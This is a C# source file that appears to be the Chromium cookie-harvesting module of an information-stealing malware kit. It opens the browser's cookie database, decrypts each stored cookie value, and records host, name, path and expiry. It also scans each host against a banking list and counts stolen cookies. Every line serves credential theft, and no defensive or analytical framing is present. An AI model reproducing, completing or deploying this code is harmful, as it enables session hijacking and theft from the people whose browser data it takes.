using System.IO;
using System.Collections.Generic;

namespace spasibozapas.Chromium
{
    internal sealed class Cookies
    {
        /// <summary>
        /// Get cookies from chromium based browsers
        /// </summary>
        /// <param name="sCookie"></param>
        /// <returns>List with cookies</returns>
        public static List<Cookie> Get(string sCookie)
        {
            List<Cookie> lcCookies = new List<Cookie>();

            try
            {
                SQLite sSQLite = SqlReader.ReadTable(sCookie, "cookies");
                if (sSQLite == null) return lcCookies;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    
                    Cookie cCookie = new Cookie();

                    cCookie.sValue = Crypto.EasyDecrypt(sCookie, sSQLite.GetValue(i, 12));


                    if (cCookie.sValue == "")
                        cCookie.sValue = sSQLite.GetValue(i, 3);


                    //cCookie.sHostKey = Crypto.GetUTF8(sSQLite.GetValue(i, 1));
                    cCookie.sHostKey = sSQLite.GetValue(i, 1);
                    cCookie.sName = sSQLite.GetValue(i, 2).ToString();
                    cCookie.sPath = sSQLite.GetValue(i, 4).ToString();
                    cCookie.sExpiresUtc = sSQLite.GetValue(i, 5).ToString();
                    cCookie.sIsSecure = sSQLite.GetValue(i, 6).ToUpper();
                   
                    //System.Console.WriteLine($"{cCookie.sHostKey} {cCookie.sName} {cCookie.sPath} {cCookie.sExpiresUtc} {cCookie.sIsSecure}");

                    Banking.ScanData(cCookie.sHostKey);
                    Counter.Cookies++;
                    lcCookies.Add(cCookie);
                }
            }
            catch (System.Exception ex) { /*deepside.Logging.Log("Chromium >> Failed collect cookies\n" + ex); */}
            return lcCookies;
        }
    }
}
